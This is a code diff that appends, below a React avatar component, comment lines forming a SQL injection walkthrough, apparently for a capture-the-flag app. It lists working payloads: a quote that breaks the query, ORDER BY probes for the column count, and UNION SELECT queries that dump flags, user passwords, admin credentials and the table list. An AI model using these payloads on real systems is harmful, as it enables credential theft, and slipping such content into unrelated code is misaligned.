@@ -223,3 +223,57 @@ function InitialAvatar({ name }: { name: string }) {
     </div>
   );
 }
+
+// VULNERABILITY :
+
+// 1. Confirm SQL Injection
+
+// Type:
+// '
+
+//  This breaks the query and the frontend will show:
+// SQL error
+//  Confirms injection works
+
+// 2. Find Number of Columns
+
+// Type:
+// %' ORDER BY 5--
+
+// Then try:
+
+// %' ORDER BY 6--
+
+//  When it errors at 6 → you know there are 5 columns
+
+//  3. Extract Data via UNION
+
+// Now you match 5 columns and inject your own SELECT.
+
+//  Get flags:
+// ' UNION SELECT flag_value, flag_name, difficulty, points, hint FROM flags--
+
+//  The table in the UI will display the flags.
+
+//  Dump users (including admin):
+// %' UNION SELECT username, password, role, email, admission_no FROM users--
+
+//  You’ll see:
+
+// usernames
+// plaintext passwords
+// roles (admin/student)
+//  Get only admin credentials:
+// %' UNION SELECT username, password, role, email, NULL FROM users WHERE role='admin'--
+
+//  4. Confirm Database Type (Optional)
+// %' UNION SELECT sqlite_version(), NULL, NULL, NULL, NULL--
+
+//  5. List Tables
+// %' UNION SELECT name, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
+//⚡ Why this works (quick recap)
+// ' → breaks out of LIKE '%...%'
+
+// UNION SELECT → adds your own query
+// -- → comments out rest of original query
+// Matching column count → required for UNION
